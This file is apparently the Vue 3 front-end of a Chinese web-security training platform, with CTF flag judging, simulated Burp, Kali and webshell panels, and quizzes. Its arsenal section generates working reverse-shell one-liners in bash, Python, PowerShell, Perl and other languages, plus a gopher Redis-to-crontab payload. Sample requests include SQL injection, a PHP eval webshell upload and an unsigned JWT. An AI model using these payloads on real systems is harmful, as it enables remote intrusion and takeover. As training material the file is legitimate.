// ========================================================================
// WebSec Learning Hub - Vue 3 主应用交互逻辑 (全课程作战任务简报与 Flag 判题版)
// ========================================================================

const { createApp, ref, computed, onMounted, watch } = Vue;

const app = createApp({
  setup() {
    // 当前主视图导航
    const currentTab = ref("roadmap"); // 'roadmap' | 'simulators' | 'audit' | 'cheatsheet' | 'tools' | 'assessment'
    const searchQuery = ref("");
    const selectedStageFilter = ref("all");
    const activeLesson = ref(null); // 当前查看详情的课程
    const activeLessonTab = ref("lecture"); // 'lecture' | 'sandbox' | 'lab' | 'checklist' | 'files'

    // 学习进度记录 (保存在 localStorage)
    const completedLessons = ref(JSON.parse(localStorage.getItem("websec_completed_lessons") || "[]"));
    const solvedFlags = ref(JSON.parse(localStorage.getItem("websec_solved_flags") || "{}")); // { "L26": { flag: "...", solvedAt: "..." } }

    const toggleLessonComplete = (lessonId) => {
      const idx = completedLessons.value.indexOf(lessonId);
      if (idx > -1) {
        completedLessons.value.splice(idx, 1);
      } else {
        completedLessons.value.push(lessonId);
      }
      localStorage.setItem("websec_completed_lessons", JSON.stringify(completedLessons.value));
    };

    const isLessonCompleted = (lessonId) => completedLessons.value.includes(lessonId);

    // --------------------------------------------------------------------
    // 作战任务简报 (Mission Briefing) 与 Flag 判题系统
    // --------------------------------------------------------------------
    const inputFlags = ref({});
    const judgeFeedbacks = ref({});
    const missionsRegistry = window.WEBSEC_DATA.missions;
    const activeSimLessonCode = ref("L26"); // 默认选中 L26 SQL 注入
    const simStageFilter = ref("all");
    const showMissionSteps = ref(false); // 控制是否展开详细操作步骤

    const filteredSimLessons = computed(() => {
      if (simStageFilter.value === "all") {
        return allLessons.value;
      }
      const stage = allStages.value.find(s => s.id === simStageFilter.value);
      return stage ? stage.lessons : allLessons.value;
    });

    const prevSimLesson = () => {
      const list = allLessons.value;
      const idx = list.findIndex(l => l.code === activeSimLessonCode.value);
      if (idx > 0) {
        selectSimLesson(list[idx - 1].code);
      } else if (idx === 0 && list.length > 0) {
        selectSimLesson(list[list.length - 1].code);
      }
    };

    const nextSimLesson = () => {
      const list = allLessons.value;
      const idx = list.findIndex(l => l.code === activeSimLessonCode.value);
      if (idx >= 0 && idx < list.length - 1) {
        selectSimLesson(list[idx + 1].code);
      } else if (idx === list.length - 1 && list.length > 0) {
        selectSimLesson(list[0].code);
      }
    };

    const activeMission = computed(() => {
      return missionsRegistry[activeSimLessonCode.value] || {
        title: `${activeSimLessonCode.value} 靶场攻防实操`,
        background: "目标环境已就绪，正在监听攻击端口。",
        objective: "使用渗透武器进行漏洞利用，获取靶机中的 Flag 标识！",
        recommendedTool: "🛰️ Burp Suite / ⚡ Kali Linux",
        flagLocation: "隐藏在目标数据库或文件系统中",
        points: 100
      };
    });

    // 计算总得分
    const totalScore = computed(() => {
      let score = 0;
      Object.keys(solvedFlags.value).forEach(code => {
        if (missionsRegistry[code]) {
          score += missionsRegistry[code].points || 100;
        }
      });
      return score;
    });

    const solvedCount = computed(() => Object.keys(solvedFlags.value).length);

    // 计算黑客段位
    const hackerRank = computed(() => {
      const s = totalScore.value;
      if (s >= 5000) return { title: "👑 王者攻防大师", color: "text-amber-400 border-amber-500 bg-amber-950" };
      if (s >= 3000) return { title: "💎 钻石白帽黑客", color: "text-cyan-400 border-cyan-500 bg-cyan-950" };
      if (s >= 1500) return { title: "🥇 黄金渗透专家", color: "text-purple-400 border-purple-500 bg-purple-950" };
      if (s >= 500) return { title: "🥈 白银安全员", color: "text-blue-400 border-blue-500 bg-blue-950" };
      return { title: "🥉 青铜安全新手", color: "text-slate-400 border-slate-700 bg-slate-900" };
    });

    // 提交 Flag 判题
    const submitFlagJudge = (lessonCode) => {
      const userFlag = (inputFlags.value[lessonCode] || "").trim();
      const targetMission = missionsRegistry[lessonCode];

      if (!targetMission) {
        judgeFeedbacks.value[lessonCode] = { isCorrect: false, msg: "该课程暂未部署 Flag 靶标！" };
        return;
      }

      if (!userFlag) {
        judgeFeedbacks.value[lessonCode] = { isCorrect: false, msg: "请输入从靶机中获取到的 Flag (格式: FLAG{...})！" };
        return;
      }

      // 严格对比（忽略大小写首尾空白）
      if (userFlag.toUpperCase() === targetMission.flag.toUpperCase()) {
        const points = targetMission.points || 100;
        solvedFlags.value[lessonCode] = {
          flag: targetMission.flag,
          points,
          solvedAt: new Date().toLocaleString()
        };
        localStorage.setItem("websec_solved_flags", JSON.stringify(solvedFlags.value));

        // 自动将对应课程标记为已学
        const lessonObj = allLessons.value.find(l => l.code === lessonCode);
        if (lessonObj && !isLessonCompleted(lessonObj.id)) {
          toggleLessonComplete(lessonObj.id);
        }

        judgeFeedbacks.value[lessonCode] = {
          isCorrect: true,
          msg: `🎉 判题通过！夺旗成功！积分 +${points} 分！`,
          points
        };
      } else {
        judgeFeedbacks.value[lessonCode] = {
          isCorrect: false,
          msg: "❌ Flag 校验错误！未能通过靶机校验，请检查是否在目标系统中找到了正确的 Flag。"
        };
      }
    };

    // --------------------------------------------------------------------
    // Markdown 渲染引擎
    // --------------------------------------------------------------------
    const renderMarkdown = (content) => {
      if (!content) return "";
      if (window.marked && typeof window.marked.parse === 'function') {
        try {
          return window.marked.parse(content);
        } catch (e) {
          console.error("Marked parse error:", e);
        }
      }

      let html = content;
      html = html.replace(/```([a-zA-Z0-9_-]*)\n([\s\S]*?)```/g, (match, lang, code) => {
        const escaped = code.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
        return `<pre><code class="language-${lang}">${escaped}</code></pre>`;
      });
      html = html.replace(/`([^`]+)`/g, (match, code) => {
        const escaped = code.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
        return `<code>${escaped}</code>`;
      });
      html = html.replace(/^#### (.*$)/gim, '<h4>$1</h4>');
      html = html.replace(/^### (.*$)/gim, '<h3>$1</h3>');
      html = html.replace(/^## (.*$)/gim, '<h2>$1</h2>');
      html = html.replace(/^# (.*$)/gim, '<h1>$1</h1>');
      html = html.replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>');
      html = html.replace(/\*(.*?)\*/g, '<em>$1</em>');
      html = html.replace(/\n\n+/g, '<br><br>');
      return html;
    };

    // --------------------------------------------------------------------
    // 课程路线图数据与过滤
    // --------------------------------------------------------------------
    const allStages = ref(window.WEBSEC_DATA.stages);
    
    const allLessons = computed(() => {
      const list = [];
      allStages.value.forEach(stg => {
        stg.lessons.forEach(l => {
          list.push({ ...l, stageId: stg.id, stageTitle: stg.title, stageColor: stg.color });
        });
      });
      return list;
    });

    const filteredStages = computed(() => {
      let stages = allStages.value;
      if (selectedStageFilter.value !== "all") {
        stages = stages.filter(s => s.id === selectedStageFilter.value);
      }

      if (!searchQuery.value.trim()) {
        return stages;
      }

      const q = searchQuery.value.toLowerCase().trim();
      return stages.map(s => {
        const matchedLessons = s.lessons.filter(l => 
          l.title.toLowerCase().includes(q) ||
          l.code.toLowerCase().includes(q) ||
          l.category.toLowerCase().includes(q) ||
          l.tags?.some(t => t.toLowerCase().includes(q)) ||
          l.summary.toLowerCase().includes(q)
        );
        return { ...s, lessons: matchedLessons };
      }).filter(s => s.lessons.length > 0);
    });

    // --------------------------------------------------------------------
    // 拟真实操武器库工作台 (Multi-Weapon Combat Workspace)
    // --------------------------------------------------------------------
    const activeCombatTool = ref("burp"); // 'burp' | 'kali' | 'antsword'

    // 1. Burp Suite 抓包重放工作台状态
    const burpRawRequest = ref(`GET /view.php?id=-1'%20UNION%20SELECT%201,user(),database()%20--+ HTTP/1.1\nHost: target.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\nCookie: session_user_id=1002\n\n`);
    const burpRawResponse = ref(`HTTP/1.1 200 OK\nServer: nginx/1.18.0\nDate: Tue, 25 Aug 2026 13:20:00 GMT\nContent-Type: application/json\n\n{\n  "id": 1,\n  "username": "root@localhost",\n  "email": "security_db",\n  "flag": "FLAG{UNION_SQLI_DATABASE_SEC_KEY_8899}"\n}`);
    const burpStatusBadge = ref(200);

    const sendBurpPacket = () => {
      const res = window.WEBSEC_COMBAT_TOOLS.sendBurpRequest(burpRawRequest.value, activeSimLessonCode.value);
      burpRawResponse.value = res.rawResponse;
      burpStatusBadge.value = res.status;
      if (res.isSuccess && res.flag) {
        copyTip.value = `🎉 靶机已返回 Flag：${res.flag} (请在下方提交判题)`;
        setTimeout(() => { copyTip.value = ""; }, 4000);
      }
    };

    // 2. Kali Linux 命令行交互终端状态
    const kaliInputCmd = ref("nmap -sS -sV -p 1-10000 192.168.1.108");
    const kaliHistory = ref([
      { cmd: "nmap -sS -sV -p 1-10000 192.168.1.108", stdout: `Starting Nmap 7.94 ( https://nmap.org )\nNmap scan report for 192.168.1.108\nPORT     STATE SERVICE     VERSION\n22/tcp   open  ssh         OpenSSH 7.4p1\n80/tcp   open  http        nginx 1.18.0\n6379/tcp open  redis       Redis key-value store 4.0.9 [🔥 未授权访问!]\n8080/tcp open  http-proxy  Apache Tomcat/8.5.39` }
    ]);

    const runKaliTerminal = () => {
      if (!kaliInputCmd.value.trim()) return;
      const res = window.WEBSEC_COMBAT_TOOLS.executeTerminalCommand(kaliInputCmd.value, activeSimLessonCode.value);
      kaliHistory.value.push({
        cmd: kaliInputCmd.value,
        stdout: res.stdout,
        flag: res.flag
      });
      if (res.flag) {
        copyTip.value = `🎉 终端已提取 Flag：${res.flag} (请在下方提交判题)`;
        setTimeout(() => { copyTip.value = ""; }, 4000);
      }
      kaliInputCmd.value = "";
    };

    const clearKaliTerminal = () => {
      kaliHistory.value = [];
    };

    // 3. 中国蚁剑 / 冰蝎 Webshell 远程管理客户端状态
    const antswordUrl = ref("http://target.com/uploads/avatar.php");
    const antswordPass = ref("cmd");
    const antswordType = ref("PHP");
    const antswordKey = ref("e45e329feb5d925b");
    const antswordResult = ref(null);

    const connectAntsword = () => {
      antswordResult.value = window.WEBSEC_COMBAT_TOOLS.connectWebshell(
        antswordUrl.value,
        antswordPass.value,
        antswordType.value,
        antswordKey.value
      );
    };

    // --------------------------------------------------------------------
    // 白盒代码审计对比
    // --------------------------------------------------------------------
    const codeAuditCases = window.WEBSEC_DATA.codeAuditCases;
    const activeAuditCase = ref(codeAuditCases[0]);

    // --------------------------------------------------------------------
    // 渗透武器库速查表与反弹 Shell 生成器 (Arsenal & Cheatsheet)
    // --------------------------------------------------------------------
    const cheatsheetCategory = ref("sqli");
    const cheatsheets = window.WEBSEC_DATA.cheatsheets;
    const cheatsheetSearchQuery = ref("");
    const revShellIp = ref("10.10.14.8");
    const revShellPort = ref("4444");
    const copyTip = ref("");

    const filteredCheatsheets = computed(() => {
      const list = cheatsheets[cheatsheetCategory.value] || [];
      if (!cheatsheetSearchQuery.value.trim()) {
        return list;
      }
      const q = cheatsheetSearchQuery.value.toLowerCase().trim();
      return list.filter(item => 
        (item.name && item.name.toLowerCase().includes(q)) ||
        (item.category && item.category.toLowerCase().includes(q)) ||
        (item.payload && item.payload.toLowerCase().includes(q)) ||
        (item.desc && item.desc.toLowerCase().includes(q))
      );
    });

    const generatedRevShells = computed(() => {
      const ip = revShellIp.value || "10.10.14.8";
      const port = revShellPort.value || "4444";
      return [
        { type: "Bash -i (最常用交互式)", code: `bash -i >& /dev/tcp/${ip}/${port} 0>&1` },
        { type: "Bash 5 描述符重定向", code: `sh -i 5<> /dev/tcp/${ip}/${port} 0<&5 1>&5 2>&5` },
        { type: "Python3 PTY (完美交互 TTY)", code: `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'` },
        { type: "NC Mkfifo 命名管道", code: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${ip} ${port} >/tmp/f` },
        { type: "NC -e 直接反弹", code: `nc -e /bin/bash ${ip} ${port}` },
        { type: "PHP fsockopen 内存执行", code: `php -r '$sock=fsockopen("${ip}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'` },
        { type: "PowerShell (Windows 靶机)", code: `$client = New-Object System.Net.Sockets.TCPClient('${ip}',${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()` },
        { type: "Java Runtime 字节码执行", code: `r = Runtime.getRuntime(); p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/${ip}/${port};cat <&5 | while read line; do \\$line 2>&5 >&5; done"] as String[]); p.waitFor();` },
        { type: "Socat 加密反弹 Shell", code: `socat tcp-connect:${ip}:${port} exec:"bash -li",pty,stderr,setsid,sigint,sane` },
        { type: "Perl 脚本执行", code: `perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'` },
        { type: "Ruby 原生反弹", code: `ruby -rsocket -e'f=TCPSocket.open("${ip}",${port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'` }
      ];
    });

    // --------------------------------------------------------------------
    // 渗透测试工具箱 & 编解码器 (Tools Hub)
    // --------------------------------------------------------------------
    const toolRawText = ref("admin' UNION SELECT 1, user(), database() --+");
    const toolSubTab = ref("encoder");
    
    const gopherTargetIp = ref("127.0.0.1");
    const gopherTargetPort = ref("6379");
    const gopherRevHost = ref("10.10.14.8");
    const gopherRevPort = ref("4444");

    const generatedGopherPayload = computed(() => {
      const ip = gopherTargetIp.value || "127.0.0.1";
      const port = gopherTargetPort.value || "6379";
      const revH = gopherRevHost.value || "10.10.14.8";
      const revP = gopherRevPort.value || "4444";
      const rawCmd = `\n\n* * * * * bash -i >& /dev/tcp/${revH}/${revP} 0>&1\n\n`;
      const encoded = encodeURIComponent(`*3\r\n$3\r\nset\r\n$1\r\n1\r\n$${rawCmd.length}\r\n${rawCmd}\r\n*4\r\n$6\r\nconfig\r\n$3\r\nset\r\n$3\r\ndir\r\n$16\r\n/var/spool/cron/\r\n*4\r\n$6\r\nconfig\r\n$3\r\nset\r\n$10\r\ndbfilename\r\n$4\r\nroot\r\n*1\r\n$4\r\nsave\r\n*1\r\n$4\r\nquit\r\n`);
      return `gopher://${ip}:${port}/_${encoded}`;
    });

    const urlEncoded = computed(() => encodeURIComponent(toolRawText.value));
    const doubleUrlEncoded = computed(() => encodeURIComponent(encodeURIComponent(toolRawText.value)));
    const base64Encoded = computed(() => {
      try { return btoa(unescape(encodeURIComponent(toolRawText.value))); }
      catch(e) { return "编码错误"; }
    });
    const hexEncoded = computed(() => {
      let hex = "0x";
      for (let i = 0; i < toolRawText.value.length; i++) {
        hex += toolRawText.value.charCodeAt(i).toString(16).padStart(2, '0');
      }
      return hex;
    });
    const space2commentEncoded = computed(() => toolRawText.value.replace(/\s+/g, "/**/"));
    const randomCaseEncoded = computed(() => toolRawText.value.split("").map((c, i) => i % 2 === 0 ? c.toUpperCase() : c.toLowerCase()).join(""));

    const copyToClipboard = (text) => {
      navigator.clipboard.writeText(text).then(() => {
        copyTip.value = "已复制到剪贴板！";
        setTimeout(() => { copyTip.value = ""; }, 1800);
      });
    };

    // --------------------------------------------------------------------
    // 阶段自测考核试题
    // --------------------------------------------------------------------
    const allQuizzes = window.WEBSEC_DATA.quizzes;
    const activeQuizStage = ref(allQuizzes[0]);
    const userAnswers = ref({});
    const quizResults = ref({});

    const selectAnswer = (questionId, optionIdx) => {
      userAnswers.value[questionId] = optionIdx;
    };

    const submitQuiz = () => {
      const qList = activeQuizStage.value.questions;
      let score = 0;
      qList.forEach(q => {
        if (userAnswers.value[q.id] === q.correct) {
          score += 25;
        }
      });
      quizResults.value[activeQuizStage.value.stageId] = {
        score,
        total: 100,
        completed: true
      };
    };

    const resetQuiz = () => {
      activeQuizStage.value.questions.forEach(q => {
        delete userAnswers.value[q.id];
      });
      delete quizResults.value[activeQuizStage.value.stageId];
    };

    const openLessonDetail = (lesson) => {
      activeLesson.value = lesson;
      activeLessonTab.value = "lecture";
    };

    const closeLessonDetail = () => {
      activeLesson.value = null;
    };

    const selectSimLesson = (code) => {
      activeSimLessonCode.value = code;
      const m = missionsRegistry[code];

      // 智能关联默认工具与初始 Payload
      if (code === "L18" || code === "L29" || code === "L34" || code === "L40" || code === "L43" || code === "L52" || code === "L58" || code === "L59") {
        activeCombatTool.value = "kali";
        if (code === "L18") kaliInputCmd.value = "nmap -sS -sV -p 1-10000 192.168.1.108";
        if (code === "L29") kaliInputCmd.value = "sqlmap -u 'http://target.com/view.php?id=1' --dbs --batch";
        if (code === "L34") kaliInputCmd.value = "dirsearch -u http://target.com/ -e php,txt,git";
        if (code === "L40") kaliInputCmd.value = "gopherus --exploit redis";
        if (code === "L52") kaliInputCmd.value = "frida -U -f com.bank.mobileapp -l bypass_ssl.js";
        if (code === "L58") kaliInputCmd.value = "cat /etc/passwd";
      } else if (code === "L30" || code === "L32" || code === "L37") {
        activeCombatTool.value = "antsword";
      } else {
        activeCombatTool.value = "burp";
        if (code === "L21") {
          burpRawRequest.value = `GET /api/user/profile?uid=1001 HTTP/1.1\nHost: target.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\nCookie: session_user_id=1002\n\n`;
        } else if (code === "L31") {
          burpRawRequest.value = `POST /upload.php HTTP/1.1\nHost: target.com\nContent-Type: multipart/form-data; boundary=---------------------------974767299852498929531610575\n\n-----------------------------974767299852498929531610575\nContent-Disposition: form-data; name="file"; filename="shell.php"\nContent-Type: image/jpeg\n\n<?php @eval($_POST['cmd']);?>\n-----------------------------974767299852498929531610575--`;
        } else if (code === "L47") {
          burpRawRequest.value = `GET /index.php HTTP/1.1\nHost: target.com\nAccept-Encoding: gzip,deflate\nAccept-Charset: c3lzdGVtKCd3aG9hbWknKTs=\nConnection: close\n\n`;
        } else if (code === "L55") {
          burpRawRequest.value = `GET /admin/dashboard HTTP/1.1\nHost: target.com\nAuthorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoicm9vdCJ9.\n\n`;
        } else {
          burpRawRequest.value = `GET /view.php?id=-1'%20UNION%20SELECT%201,user(),database()%20--+ HTTP/1.1\nHost: target.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\nCookie: session_user_id=1002\n\n`;
        }
      }
    };

    return {
      currentTab,
      searchQuery,
      selectedStageFilter,
      activeLesson,
      activeLessonTab,
      completedLessons,
      toggleLessonComplete,
      isLessonCompleted,
      renderMarkdown,
      allStages,
      allLessons,
      filteredStages,
      openLessonDetail,
      closeLessonDetail,
      // 作战任务简报与 Flag 判题
      activeMission,
      showMissionSteps,
      inputFlags,
      judgeFeedbacks,
      missionsRegistry,
      solvedFlags,
      totalScore,
      solvedCount,
      hackerRank,
      submitFlagJudge,
      // 拟真打靶武器库
      activeCombatTool,
      activeSimLessonCode,
      selectSimLesson,
      simStageFilter,
      filteredSimLessons,
      prevSimLesson,
      nextSimLesson,
      // Burp Suite
      burpRawRequest,
      burpRawResponse,
      burpStatusBadge,
      sendBurpPacket,
      // Kali Terminal
      kaliInputCmd,
      kaliHistory,
      runKaliTerminal,
      clearKaliTerminal,
      // AntSword Webshell Manager
      antswordUrl,
      antswordPass,
      antswordType,
      antswordKey,
      antswordResult,
      connectAntsword,
      // 审计
      codeAuditCases,
      activeAuditCase,
      // 武器库
      cheatsheetCategory,
      cheatsheets,
      cheatsheetSearchQuery,
      filteredCheatsheets,
      revShellIp,
      revShellPort,
      generatedRevShells,
      copyToClipboard,
      copyTip,
      // 工具箱
      toolRawText,
      toolSubTab,
      gopherTargetIp,
      gopherTargetPort,
      gopherRevHost,
      gopherRevPort,
      generatedGopherPayload,
      urlEncoded,
      doubleUrlEncoded,
      base64Encoded,
      hexEncoded,
      space2commentEncoded,
      randomCaseEncoded,
      // 考核
      allQuizzes,
      activeQuizStage,
      userAnswers,
      quizResults,
      selectAnswer,
      submitQuiz,
      resetQuiz
    };
  }
});

app.mount("#app");
